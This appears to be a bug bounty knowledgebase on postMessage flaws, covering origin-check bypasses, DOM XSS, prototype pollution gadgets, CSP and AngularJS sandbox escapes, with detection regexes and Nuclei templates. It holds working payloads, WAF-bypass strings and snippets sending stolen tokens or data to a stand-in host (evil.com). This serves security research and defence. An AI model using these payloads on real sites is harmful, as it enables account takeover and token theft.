# PostMessage Vulnerabilities — Advanced Bug Bounty Knowledgebase

> **Classification:** Client-Side / DOM-Based / Cross-Origin Communication  
> **Scope:** postMessage, MessageEvent, BroadcastChannel, MessageChannel, opener abuse, DOM XSS chains, prototype pollution gadgets, CSP bypasses, token leakage, and real-world exploitation workflows.  
> **Last Updated:** 2026-05-23

---

## Table of Contents

- [Basics](#basics)
- [postMessage Theory](#postmessage-theory)
- [MessageEvent Internals](#messageevent-internals)
- [Origin Validation Weaknesses](#origin-validation-weaknesses)
- [Wildcard Origin Abuse](#wildcard-origin-abuse)
- [iframe Communication Abuse](#iframe-communication-abuse)
- [BroadcastChannel Abuse](#broadcastchannel-abuse)
- [MessageChannel Abuse](#messagechannel-abuse)
- [opener/postMessage Abuse](#openerpostmessage-abuse)
- [DOM XSS Chains](#dom-xss-chains)
- [Prototype Pollution + postMessage Chains](#prototype-pollution--postmessage-chains)
- [CSP Bypass Chains](#csp-bypass-chains)
- [Sandbox Escape Chains](#sandbox-escape-chains)
- [Token Leakage Techniques](#token-leakage-techniques)
- [Cross-Origin Communication Abuse](#cross-origin-communication-abuse)
- [Clickjacking + postMessage Chains](#clickjacking--postmessage-chains)
- [Gadget Chains](#gadget-chains)
- [Browser Quirks](#browser-quirks)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

**postMessage** is a browser API that enables secure cross-origin communication between `Window` objects (e.g., between a page and an iframe, popup, or parent window). Despite its design intent, insecure implementations are a prolific source of **DOM-based XSS**, **data exfiltration**, and **origin validation bypasses**.

### Core Vulnerable Pattern

```javascript
window.addEventListener("message", (event) => {
    // MISSING: event.origin validation
    // MISSING: event.source validation
    eval(event.data); // or innerHTML, location.href, etc.
});
```

### Key Security Principle

> **Always verify the sender's identity using `event.origin` and `event.source`. Always validate the syntax of the received message. Never use `*` as `targetOrigin` when sending sensitive data.**

---

## postMessage Theory

### The `postMessage()` Signature

```javascript
postMessage(message, targetOrigin)
postMessage(message, targetOrigin, transfer)
postMessage(message, options)
```

| Parameter | Description |
|-----------|-------------|
| `message` | Data serialized via the structured clone algorithm |
| `targetOrigin` | Exact origin required for dispatch (`scheme://host:port`) or `*` |
| `transfer` | Transferable objects (ArrayBuffer, MessagePort) |
| `options` | `{ targetOrigin, transfer }` |

### The Dispatched Event (`MessageEvent`)

```javascript
window.addEventListener("message", (event) => {
    event.data;     // Payload
    event.origin;   // Sender origin (scheme://host:port)
    event.source;   // Reference to sender window
    event.ports;    // Array of MessagePort objects
});
```

### Critical MDN Security Notes

- If you do not expect cross-site messages, **do not add `message` event listeners**.
- `event.origin` is **not guaranteed** to be the current/future origin of the sender window (it may have navigated).
- For IDN hostnames, `origin` may be Unicode or punycode — check both.
- `javascript:` and `data:` URLs report the origin of the script that loaded them.
- In extensions, `event.source` is always `null` for chrome-code `postMessage`.

---

## MessageEvent Internals

### Properties

| Property | Type | Notes |
|----------|------|-------|
| `data` | any | Structured clone result |
| `origin` | string | `protocol + "://" + host + (non-default port)` |
| `lastEventId` | string | For server-sent events |
| `source` | `WindowProxy` \| `MessagePort` \| `ServiceWorker` | Sender reference |
| `ports` | `MessagePort[]` | For channel messaging |

### Two-Way Communication Idiom

```javascript
// Receiver
window.addEventListener("message", (event) => {
    if (event.origin !== "https://trusted.example.com") return;
    event.source.postMessage("response", event.origin); // Safe reply
});
```

### Dangerous Patterns

```javascript
// Pattern 1: No origin check
window.addEventListener("message", (e) => eval(e.data));

// Pattern 2: Origin check after sink usage
window.addEventListener("message", (e) => {
    document.body.innerHTML = e.data; // XSS before check
    if (e.origin !== "https://safe.com") return;
});

// Pattern 3: Partial origin check (regex bypass prone)
if (e.origin.includes("example.com")) { ... }
```

---

## Origin Validation Weaknesses

### 1. Missing Origin Check

The most common vulnerability. Any window can send messages to any other window in the frame hierarchy.

```javascript
// VULNERABLE
window.addEventListener("message", (e) => {
    process(e.data);
});
```

### 2. Insecure Origin Comparison

```javascript
// VULNERABLE - substring match
if (event.origin.indexOf("example.com") !== -1) { ... }

// VULNERABLE - endsWith bypass
if (event.origin.endsWith(".example.com")) { ... }
// Bypass: https://attacker.example.com.evil.com
```

### 3. Protocol/Port Mismatch

```javascript
// VULNERABLE - checks host only
if (event.origin === "example.com") { ... }
// Bypass: http://example.com, https://evil.com?example.com
```

### 4. Null Origin Bypass

Sandboxed iframes (`sandbox="allow-scripts"`), `data:` URIs, and `javascript:` URIs may have an **opaque origin** serialized as the string `"null"`. If the receiver trusts `"null"`, it accepts messages from any sandboxed context.

```javascript
// VULNERABLE
if (event.origin === "null" || event.origin === "https://trusted.com") {
    // Accepts messages from sandboxed iframes
}
```

### 5. `file://` Origin

`file://` URLs cannot be used as `targetOrigin`; sending to them requires `*`. Receivers on `file://` origins may be attacked by local HTML files.

### 6. Origin Spoofing via `document.domain`

`document.domain` relaxation **does not** affect `postMessage` origin values. However, developers sometimes incorrectly assume it does and implement flawed checks.

---

## Wildcard Origin Abuse

### The `*` TargetOrigin

```javascript
// DANGEROUS - sends to any origin
window.postMessage(secretData, "*");
```

If the target window navigates to an attacker-controlled domain before the message is processed, the message is leaked.

### Exploitation Chain

1. Victim page opens `https://victim.com/sensitive` in a popup/iframe.
2. Attacker navigates popup to `https://evil.com` via `window.location` or `window.open` race.
3. Victim sends `postMessage(data, "*")`.
4. Attacker receives sensitive data at `https://evil.com`.

### Wildcard in Receiver Logic

```javascript
// VULNERABLE - accepts from any origin
if (event.origin !== "*") return; // Nonsensical but seen in the wild
```

---

## iframe Communication Abuse

### iframe-to-Parent Exfiltration

```javascript
// Attacker iframe on victim domain
window.parent.postMessage(document.cookie, "*");
```

### Parent-to-iframe Command Injection

```javascript
// Parent sends attacker-controlled data to iframe
iframe.contentWindow.postMessage(userInput, "*");
// If iframe doesn't validate origin, XSS occurs inside iframe
```

### SOP Bypass via Nested iframes

```javascript
// top -> attacker.com -> victim.com iframe
// victim.com iframe sends postMessage to parent (attacker.com)
// attacker.com forwards to top, bypassing direct SOP restrictions
```

### Stealing postMessage by Modifying iframe Location

```javascript
// If the victim page embeds an iframe and listens for messages,
// an attacker can iframe the victim, then navigate inner frames
// to intercept messages intended for the original target.
```

### Blocking Main Page to Steal postMessage

```javascript
// Attacker iframes victim and uses beforeunload / alert() to
// block the main thread, causing messages to queue or be redirected
// to attacker-controlled contexts.
```

---

## BroadcastChannel Abuse

### API Overview

```javascript
const bc = new BroadcastChannel("channel_name");
bc.postMessage("data");
bc.onmessage = (event) => { ... };
```

### Security Model

- **Same-origin only**: Any browsing context of the same origin can subscribe.
- No origin check is possible (intra-origin by design).
- Vulnerable if an attacker can execute JS on the same origin (via XSS, subdomain takeover, etc.).

### Exploitation

```javascript
// Attacker with XSS on sub.example.com
const bc = new BroadcastChannel("auth_channel");
bc.onmessage = (e) => {
    fetch("https://evil.com/log?data=" + encodeURIComponent(e.data));
};
```

### PostMessage + BroadcastChannel Bridge

```javascript
// Attacker receives postMessage from cross-origin, then
// forwards to BroadcastChannel to reach other same-origin tabs.
window.addEventListener("message", (e) => {
    if (e.origin === "https://partner.com") {
        new BroadcastChannel("internal").postMessage(e.data);
    }
});
```

---

## MessageChannel Abuse

### API Overview

```javascript
const channel = new MessageChannel();
window.postMessage("init", "*", [channel.port2]);

channel.port1.onmessage = (e) => { ... };
channel.port1.postMessage("reply");
```

### Risks

- Ports transferred to attacker-controlled frames enable **direct two-way communication**.
- If `port2` is transferred to an iframe that later navigates to an evil domain, the attacker gains a persistent communication channel.

### Exploitation Pattern

```javascript
// Victim transfers port2 to an iframe
iframe.contentWindow.postMessage("setup", "*", [channel.port2]);
// Attacker navigates iframe to evil.com
// evil.com now holds port2 and can communicate with victim
```

---

## opener/postMessage Abuse

### `window.opener` + `postMessage` Leakage

```javascript
// Victim opens attacker window
window.open("https://evil.com", "_blank");

// Attacker receives reference via opener
window.opener.postMessage("request_data", "*");
```

### Reverse Tabnabbing + postMessage

```javascript
// Attacker opens victim in new tab, then changes opener.location
// Victim sends postMessage to opener (now attacker)
var win = window.open("https://victim.com/dashboard");
setTimeout(() => {
    win.opener.location = "https://evil.com/catcher";
}, 1000);
```

### `noopener` Protection

Always use `noopener` to sever opener references:

```html
<a href="..." target="_blank" rel="noopener noreferrer">Safe Link</a>
```

---

## DOM XSS Chains

### postMessage as XSS Source

postMessage data is a **DOM-based source**. When passed to sinks without validation, XSS occurs.

**Dangerous Sinks:**

| Sink | Example |
|------|---------|
| `eval` | `eval(event.data)` |
| `innerHTML` | `el.innerHTML = event.data` |
| `document.write` | `document.write(event.data)` |
| `location` | `location = event.data` |
| `setTimeout` | `setTimeout(event.data, 100)` |
| `setInterval` | `setInterval(event.data, 100)` |
| `Function` | `new Function(event.data)()` |
| `script.src` | `script.src = event.data` |
| `iframe.srcdoc` | `iframe.srcdoc = event.data` |

### postMessage-to-innerHTML Chain

```javascript
window.addEventListener("message", (e) => {
    if (e.origin !== "https://trusted.com") return;
    document.getElementById("output").innerHTML = e.data.message;
});
```

**Payload:**
```json
{"message": "<img src=x onerror=alert(1)>"}
```

### postMessage-to-eval Chain

```javascript
window.addEventListener("message", (e) => {
    if (e.data.type === "exec") eval(e.data.code);
});
```

**Payload:**
```json
{"type": "exec", "code": "alert(document.domain)"}
```

### postMessage-to-location Chain (Open Redirect + XSS)

```javascript
window.addEventListener("message", (e) => {
    if (e.data.action === "navigate") location.href = e.data.url;
});
```

**Payload:**
```json
{"action": "navigate", "url": "javascript:alert(1)"}
```

---

## Prototype Pollution + postMessage Chains

### Theory

Client-side prototype pollution (via query parameters, JSON merge, or DOM clobbering) can modify `Object.prototype` properties. If postMessage handlers access object properties without `hasOwnProperty` checks, polluted prototypes alter execution flow.

### Gadget: jQuery + postMessage

```javascript
// Polluted prototype affects jQuery $.get/post handlers
// If postMessage handler uses jQuery to render content:
?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>
```

### Gadget: PostMessage Handler Property Lookup

```javascript
// Vulnerable handler
window.addEventListener("message", (e) => {
    let config = e.data.config || {};
    let mode = config.mode; // Reads from prototype if missing
    if (mode === "debug") console.log(e.data.secret);
});
```

**Pollution:**
```javascript
Object.prototype.mode = "debug";
```

### Gadget: URL Parsing in postMessage

```javascript
// Handler parses URL from postMessage data
let url = new URL(e.data.endpoint);
// Polluted prototype affects URL constructor behavior
```

### DOM Clobbering + postMessage

DOM Clobbering can override variables that postMessage handlers depend on.

```html
<form id="config"><input id="trustedOrigin" value="https://evil.com"></form>
<script>
// Attacker clobbers config.trustedOrigin
window.addEventListener("message", (e) => {
    if (e.origin === config.trustedOrigin.value) { // Clobbered!
        eval(e.data);
    }
});
</script>
```

### Advanced DOM Clobbering (3+ levels)

```html
<form id=x name=y><input id=z></form>
<form id=x></form>
<script>alert(x.y.z)</script>
```

### iframe srcdoc Clobbering

```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<style>@import '//attacker.com';</style>
<script>alert(a.b.c.d)</script>
```

---

## CSP Bypass Chains

### postMessage + CSP Policy Injection

If the victim uses a CSP with `report-uri` containing a token/parameter, and the attacker can inject into that parameter, the entire CSP can be broken in Edge (legacy) or directives can be overwritten in Chrome.

**Edge (Legacy) Behavior:** Invalid syntax drops the **entire policy**.
```http
Content-Security-Policy: ...; report-uri /csp?token=VALID;_
```
Edge drops policy on `;_`.

**Chrome Behavior:** `script-src-elem` overrides existing `script-src`.
```http
Content-Security-Policy: ...; report-uri /csp?token=VALID; script-src-elem 'unsafe-inline'
```

### postMessage + `javascript:` URLs

If CSP lacks `unsafe-inline` but the application uses postMessage to set `location.href`, a `javascript:` URL bypasses CSP:

```javascript
window.addEventListener("message", (e) => {
    location.href = e.data; // javascript:alert(1) bypasses CSP
});
```

### postMessage + AngularJS CSP Bypasses

AngularJS sandbox escapes combined with CSP mode:

```html
<div ng-click="$event.path|orderBy:'[].constructor.from([1],alert)'">test</div>
```

This bypasses Angular CSP mode by using `Array.from` to call `alert` indirectly.

---

## Sandbox Escape Chains

### AngularJS Sandbox Escapes (DOM-Based)

Angular expressions in `orderBy` filters or `ng-app` contexts can be injected via postMessage if the application dynamically sets Angular templates.

**1.0.1 - 1.1.5:**
```javascript
constructor.constructor('alert(1)')()
```

**1.2.0 - 1.2.18:**
```javascript
a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
```

**1.2.19 - 1.2.23:**
```javascript
toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);
```

**1.2.24 - 1.2.26 / 1.3.0 - 1.3.1:**
```javascript
{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;
g={}[['__proto__']]['x'];
{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');
{}[['__proto__']]['z']=constructor.defineProperty;
d={}[['__proto__']]['z'];
d(''.sub[['__proto__']],'constructor',{value:false});
{}[['__proto__']]['y'].value('alert(1)')()
```

**1.2.27 - 1.2.29 / 1.3.0 - 1.3.20:**
```javascript
{}.")));alert(1)//";
```

**1.4.0 - 1.4.5 (Chrome only):**
```javascript
o={};
l=o[['__lookupGetter__']];
(l=l)('event')().target.defaultView.location='javascript:alert(1)';
```

**1.4.5 - 1.5.8:**
```javascript
x={y:''.constructor.prototype};
x.y.charAt=[].join;
[1]|orderBy:'x=alert(1)'
```

**>= 1.6.0 (Sandbox removed):**
```javascript
constructor.constructor('alert(1)')()
```

### postMessage-to-Sandbox-Escape

If a sandboxed iframe receives postMessage and passes data to `eval` or `innerHTML`, it can escape the sandbox context.

```javascript
// Inside sandboxed iframe
window.addEventListener("message", (e) => {
    if (e.origin === "https://trusted.com") {
        document.body.innerHTML = e.data; // XSS inside sandbox
    }
});
```

---

## Token Leakage Techniques

### OAuth / Session Token Exfiltration

```javascript
// Victim page holds token in JS variable
window.addEventListener("message", (e) => {
    if (e.data.action === "getToken") {
        e.source.postMessage({token: localStorage.getItem("auth")}, "*");
    }
});
```

### postMessage + X-Frame-Options Bypass

If a page with sensitive tokens is frameable and uses postMessage, an attacker can iframe it and send a message requesting the token.

```javascript
// Attacker page
let victim = document.createElement("iframe");
victim.src = "https://victim.com/profile";
document.body.appendChild(victim);

setTimeout(() => {
    victim.contentWindow.postMessage({action: "getToken"}, "*");
}, 2000);

window.addEventListener("message", (e) => {
    if (e.data.token) fetch("https://evil.com/?t=" + e.data.token);
});
```

### postMessage + localStorage/sessionStorage Theft

```javascript
window.addEventListener("message", (e) => {
    if (e.data === "getStorage") {
        e.source.postMessage({
            local: JSON.stringify(localStorage),
            session: JSON.stringify(sessionStorage)
        }, "*");
    }
});
```

---

## Cross-Origin Communication Abuse

### postMessage as CORS Bypass

If a page uses postMessage to proxy cross-origin data to an iframe, an attacker can intercept or manipulate the data.

```javascript
// Proxy pattern (vulnerable)
window.addEventListener("message", (e) => {
    fetch(e.data.url)
        .then(r => r.text())
        .then(t => e.source.postMessage(t, "*"));
});
```

### postMessage + WebSocket Bridge

```javascript
// Attacker sends postMessage to victim, victim forwards to WebSocket
// Attacker can now send WebSocket messages without direct access
window.addEventListener("message", (e) => {
    ws.send(e.data); // No origin check
});
```

---

## Clickjacking + postMessage Chains

### UI Redressing + postMessage

1. Attacker frames victim page with transparent overlay.
2. User clicks button on attacker page.
3. Attacker simultaneously sends postMessage to victim frame to trigger action.
4. Victim processes postMessage (believing it came from trusted parent) and executes sensitive action.

### postMessage + `X-Frame-Options` Bypass via `allow-popups`

If victim is framed and uses `postMessage` to communicate with parent, an attacker can:
1. Frame victim.
2. Send `postMessage` mimicking parent commands.
3. Trick victim into opening popup via `window.open` from postMessage handler.
4. Popup opens with attacker-controlled URL, stealing `window.opener` reference.

---

## Gadget Chains

### jQuery Gadgets via Prototype Pollution

| Gadget | Payload | Effect |
|--------|---------|--------|
| `$.get` | `?__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x` | XSS |
| `$.getScript >= 3.4.0` | `?__proto__[src][]=data:,alert(1)//` | XSS |
| `$(html)` | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>` | XSS |
| `$(x).attr` | `?__proto__[OnError]=alert(1)&__proto__[SRC]=x` | XSS |
| `$(x).on` | `?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror=alert(1)>` | XSS |

### Google Closure Gadgets

```http
?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
```

### Vue.js Gadgets

```http
?__proto__[v-if]=_c.constructor('alert(1)')()
?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
?__proto__[template]=<script>alert(1)</script>
```

### DOMPurify Bypass Gadgets

```http
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
?__proto__[documentMode]=9
```

### Google Tag Manager Gadgets

```http
?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://evil.com/xss.js
```

### Lodash Gadget

```http
?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)
```

---

## Browser Quirks

### IDN / Punycode Origins

For IDN hostnames, `event.origin` may be Unicode (`https://münchen.example`) or punycode (`https://xn--mnchen-3ya.example`). Always normalize before comparison.

### `data:` / `javascript:` Origins

The origin is the origin of the **script that loaded the URL**, not `"null"` in all cases. However, sandboxed iframes without `allow-same-origin` report `"null"`.

### `file://` Origins

- `postMessage` to `file://` requires `targetOrigin = "*"` .
- `file://` receivers should be considered untrusted in many contexts.

### Chrome Popover + Hidden Input / Meta Tag XSS

Chrome's new popover API allows `onbeforetoggle` and `ontoggle` events on **hidden inputs** and **meta tags** via duplicate ID targeting:

```html
<button popovertarget=x>Click</button>
<input type="hidden" value="y" popover id=x onbeforetoggle=alert(1)>
<div popover id=x>Popup</div>
```

When the button is clicked, the hidden input's `onbeforetoggle` fires first due to DOM order.

### Firefox `base` Tag + Protocol Abuse

Firefox allows protocol inheritance from `<base>` tags, enabling unencoded value injection:

```html
<base href=a:abc><a id=x href="Firefox<>">
<script>alert(x)//Firefox<></script>
```

### Chrome `base` + `href` Clobbering

```html
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
<script>alert(x.xyz)//a://Clobbered<></script>
```

### Anchor Tag `username` / `password` Properties

Non-standard DOM properties exposed via `href`:

```html
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
<script>
alert(x.username)//Clobbered-username
alert(x.password)//Clobbered-Password
</script>
```

---

## Real World Case Studies

### Case Study 1: Uber postMessage Token Leak

Uber's login flow used postMessage to communicate tokens between domains. An attacker could iframe the flow and intercept the postMessage containing the OAuth token due to missing origin validation and wildcard usage.

### Case Study 2: PayPal CSP Policy Injection

PayPal's CSP included a `report-uri` directive with a user-controlled `token` parameter. Injection of `;_` (Edge) or `; script-src-elem 'unsafe-inline'` (Chrome) broke CSP protections, enabling XSS via postMessage vectors.

### Case Study 3: Gmail DOM Clobbering (Michał Bentkowski)

DOM Clobbering was used to exploit Gmail six years after the technique was introduced. HTML elements with matching `id` and `name` attributes formed DOM collections that overrode expected JavaScript objects, leading to XSS.

### Case Study 4: Adobe Experience Manager postMessage XSS

Adobe's AEM quicksearch component used postMessage without origin validation. The `postMessage-tracker` extension revealed the listener:

```javascript
function(msg) {
    var msgData = msg.originalEvent.data;
    if (msgData.msgid != "docstrap.quicksearch.start") return;
    var results = Searcher.search(msgData.searchTerms);
    window.parent.postMessage({"results": results, "msgid": "docstrap.quicksearch.done"}, "*");
}
```

An attacker could iframe the component and receive search results cross-origin.

---

## Fuzzing Payloads

### Origin Validation Fuzzing

```javascript
// Test exact match bypasses
"https://example.com"
"https://example.com:443"
"https://example.com."
"https://example.com.evil.com"
"null"
"file://"
"http://example.com"
```

### postMessage Data Fuzzing

```json
{"type": "exec", "code": "alert(1)"}
{"action": "navigate", "url": "javascript:alert(1)"}
{"html": "<img src=x onerror=alert(1)>"}
{"config": {"mode": "debug", "secret": true}}
{"__proto__": {"mode": "debug"}}
```

### DOM Clobbering Fuzzing

```html
<form id=config><input id=trustedOrigin value=https://evil.com></form>
<a id=x name=y href="cid:Clobbered">
<iframe name=a srcdoc="<a id=c name=d href=cid:test><a id=c>">
```

### AngularJS Expression Fuzzing

```javascript
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

---

## Automation Workflows

### postMessage Listener Detection

```javascript
// In browser console - list all postMessage listeners
getEventListeners(window).message;
```

### postMessage-Tracker Workflow

1. Install `postMessage-tracker` Chrome extension.
2. Browse target application.
3. Observe extension icon for listener count.
4. Check console for `top->top.frames[N]` message flows.
5. Log listeners to remote endpoint for batch analysis.
6. Identify anonymous functions (`bound`) for manual review.

### pp-finder Workflow (Prototype Pollution)

```bash
# Install
npm install -g pp-finder

# Run against target application
pp-finder run node ./app.js

# Or with loader
node --loader pp-finder ./app.js
```

### DOM Invader Workflow (Burp Suite)

1. Enable DOM Invader extension in Burp's embedded browser.
2. Navigate to target.
3. DOM Invader highlights DOM-based sources and sinks.
4. Use "postMessage" filter to identify vulnerable listeners.
5. Test origin validation and data handling automatically.

---

## Recon Methodology

### Step 1: Identify postMessage Listeners

```javascript
// Bookmarklet to dump listeners
javascript:(function(){
    var e = getEventListeners(window);
    if(e && e.message) {
        console.table(e.message.map(l => ({
            origin: l.listener.toString().includes('origin'),
            sink: l.listener.toString()
        })));
    } else {
        alert('No listeners or getEventListeners unavailable');
    }
})();
```

### Step 2: Check for Missing Origin Validation

- Open DevTools -> Sources -> Event Listener Breakpoints -> `postMessage`.
- Trigger application functionality.
- Inspect handler code for `event.origin` checks.

### Step 3: Identify Message Sources

- Look for `window.postMessage` calls in JavaScript.
- Check for `targetOrigin === "*"` patterns.
- Review iframe/popup interactions.

### Step 4: Map Sinks

Trace `event.data` from listener to:
- `eval` / `Function` / `setTimeout`
- `innerHTML` / `outerHTML` / `document.write`
- `location.href` / `location.replace` / `location.assign`
- `script.src` / `iframe.srcdoc`
- `WebSocket.send` / `fetch` / `XHR`

### Step 5: Test Origin Validation Bypasses

```javascript
// Test in console of attacker page
let victim = window.open("https://victim.com");
setTimeout(() => {
    victim.postMessage({"action": "test"}, "*");
}, 1000);
```

### Step 6: Prototype Pollution Recon

```bash
# Check for prototype pollution endpoints
?__proto__[test]=polluted
# Then check if Object.prototype.test === "polluted"
```

### Step 7: iframe / Window Hierarchy Analysis

```javascript
// Dump frame hierarchy
for(let i=0; i<window.frames.length; i++) {
    console.log(i, window.frames[i].location.href);
}
```

---

## Nuclei Templates

### Template Logic: postMessage Origin Validation Check

```yaml
id: postmessage-origin-check

info:
  name: postMessage Missing Origin Validation
  author: custom
  severity: medium
  description: Detects postMessage listeners without origin validation

file:
  - extensions:
      - js
      - html
    matchers:
      - type: regex
        regex:
          - 'addEventListener\(["']message["']'
      - type: regex
        regex:
          - 'event\.origin'
        negative: true
      - type: regex
        regex:
          - 'postMessage\([^,]+,\s*["']\*["']\)'
```

### Template Logic: postMessage Wildcard TargetOrigin

```yaml
id: postmessage-wildcard-target

info:
  name: postMessage Wildcard TargetOrigin
  author: custom
  severity: info

file:
  - extensions:
      - js
    matchers:
      - type: regex
        regex:
          - '\.postMessage\([^)]+,\s*\*\s*\)'
```

### Template Logic: Prototype Pollution Gadget Detection

```yaml
id: prototype-pollution-gadget

info:
  name: Client-Side Prototype Pollution Gadget
  author: custom
  severity: high

file:
  - extensions:
      - js
    matchers:
      - type: regex
        regex:
          - 'hasOwnProperty\s*\('
        negative: true
      - type: regex
        regex:
          - 'for\s*\(\s*var\s+\w+\s+in\s+'
          - 'Object\.assign\s*\('
          - '_.merge\s*\('
```

### Template Logic: AngularJS Sandbox Escape Detection

```yaml
id: angularjs-sandbox-escape

info:
  name: AngularJS Expression Injection
  author: custom
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}?q={{1+1}}"
    matchers:
      - type: word
        words:
          - "2"
```

---

## Tools and Scanners

| Tool | Purpose | URL |
|------|---------|-----|
| **postMessage-tracker** | Chrome extension to track postMessage listeners, origins, and stacks | https://github.com/fransr/postMessage-tracker |
| **DOM Invader** | Burp Suite extension for DOM-based vulnerability detection | https://github.com/PortSwigger/dom-invader |
| **pp-finder** | Find prototype pollution gadgets in JS code | https://github.com/yeswehack/pp-finder |
| **pp-debugger** | Chrome DevTools extension for prototype pollution debugging | https://github.com/GoogleChromeLabs/pp-debugger |
| **CursedChrome** | Chrome extension implant for red teaming | https://github.com/mandatoryprogrammer/CursedChrome |
| **Nuclei** | Fast vulnerability scanner with custom templates | https://github.com/projectdiscovery/nuclei |
| **katana** | Web crawler for endpoint discovery | https://github.com/projectdiscovery/katana |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **interactsh** | Out-of-band interaction collector | https://github.com/projectdiscovery/interactsh |

---

## Advanced Research

### PortSwigger Research: DOM Clobbering Strikes Back

- DOM Clobbering enables XSS by injecting HTML elements that override JavaScript variables via `id` and `name` attributes.
- New techniques allow clobbering **3+ levels deep** using nested iframes and `srcdoc`.
- `style @import` can create a delay allowing iframe srcdoc to render without `setTimeout`.
- Anchor tags expose `username` and `password` properties from URL credentials.
- `base` tag protocol inheritance enables unencoded injection in Firefox and Chrome.

### PortSwigger Research: AngularJS Sandbox Escapes

- Angular expressions in `orderBy` filters execute without `{{}}` delimiters.
- Sandbox escapes work by corrupting native prototypes (`String.prototype.charAt`, `Array.prototype.join`) to inject code into Angular's rewritten expression output.
- CSP mode bypasses use `Array.from([1], alert)` to call functions indirectly.
- Angular removed the sandbox entirely in 1.6+ because it provided false security.

### PortSwigger Research: Bypassing CSP with Policy Injection

- `report-uri` directives with user-controlled parameters enable CSP injection.
- Edge drops the entire policy on invalid syntax (`;_`).
- Chrome allows directive override via `script-src-elem` injection.

### PortSwigger Research: XSS in Hidden Inputs and Meta Tags

- Chrome's popover API introduces `onbeforetoggle` and `ontoggle` events.
- These events fire on hidden inputs and meta tags when targeted by `popovertarget`.
- Requires duplicate IDs or controlled injection before existing popover elements.

---

## Bug Bounty Writeups

### Key Findings

1. **Missing Origin Check -> XSS:** $2,000-$10,000+
2. **postMessage Token Leakage -> Account Takeover:** $5,000-$15,000+
3. **postMessage + Prototype Pollution -> DOM XSS:** $3,000-$8,000+
4. **postMessage + CSP Bypass -> XSS on High-Profile Target:** $900-$5,000+
5. **Wildcard postMessage + Sensitive Data Exposure:** $1,000-$5,000+

### Research Notes

- Always check **child iframes** for postMessage listeners; they are often less protected.
- **Short-lived listeners** (enabled only during specific UI interactions) are commonly missed by static analysis — use `postMessage-tracker`.
- **Wrapper libraries** (Raven, New Relic, Rollbar, Bugsnag, jQuery) obscure the real listener; bypass wrappers to inspect actual handlers.
- **Anonymous functions** appear as `bound` in trackers and require manual deobfuscation.

---

## Payload Collections

### postMessage XSS Payloads

```javascript
// Basic eval
{"type":"exec","code":"alert(1)"}

// innerHTML
{"html":"<img src=x onerror=alert(1)>"}

// location redirect
{"url":"javascript:alert(1)"}

// AngularJS orderBy
[1]|orderBy:'x=alert(1)'

// Prototype pollution + jQuery
?__proto__[div][1]=<img/src/onerror=alert(1)>
```

### postMessage Origin Bypass Payloads

```
https://example.com.evil.com
https://evil.com?example.com
null
file://
http://example.com
https://example.com:443 (port normalization issues)
```

### postMessage Data Exfiltration

```javascript
// Request token
{action: "getToken"}

// Request storage
{action: "getStorage"}

// Request user data
{action: "getProfile"}
```

---

## WAF Bypasses

### Event Attribute Alternatives

```html
onbeforetoggle=alert(1)
ontoggle=alert(1)
onfocusin=alert(1)
onfocusout=alert(1)
```

### Protocol Obfuscation

```javascript
javascript:alert(1)
jaVaScRiPt:alert(1)
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)
```

### JSON Polyglots

```json
{"message": "<img src=x onerror=alert(1)>"}
{"message": "<svg onload=alert(1)>"}
{"message": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"}
```

### Prototype Pollution WAF Bypass

```http
?__proto__[ONERROR]=1&__proto__[SRC]=1
?constructor[prototype][onerror]=alert(1)
```

---

## Detection Techniques

### Static Analysis Patterns

```regex
addEventListener\s*\(\s*["']message["']
\.postMessage\s*\(
event\.data\s*(?:\.\w+\s*)*(?:innerHTML|eval|document\.write|location)
```

### Dynamic Analysis

1. **Breakpoint on `postMessage` handler** in DevTools.
2. **Trace `event.data`** from entry to sink.
3. **Override `window.postMessage`** to log all messages:

```javascript
const orig = window.postMessage;
window.postMessage = function(msg, targetOrigin, transfer) {
    console.trace("postMessage:", {msg, targetOrigin, transfer});
    return orig.apply(this, arguments);
};
```

### Heuristic Detection

- Listeners without `event.origin` comparison within 3 lines of `event.data` usage.
- `postMessage` with `*` targetOrigin near sensitive data variables.
- `BroadcastChannel` usage on authentication/session pages.

---

## References

### PortSwigger
- https://portswigger.net/web-security/dom-based/web-message-manipulation
- https://portswigger.net/web-security/dom-based
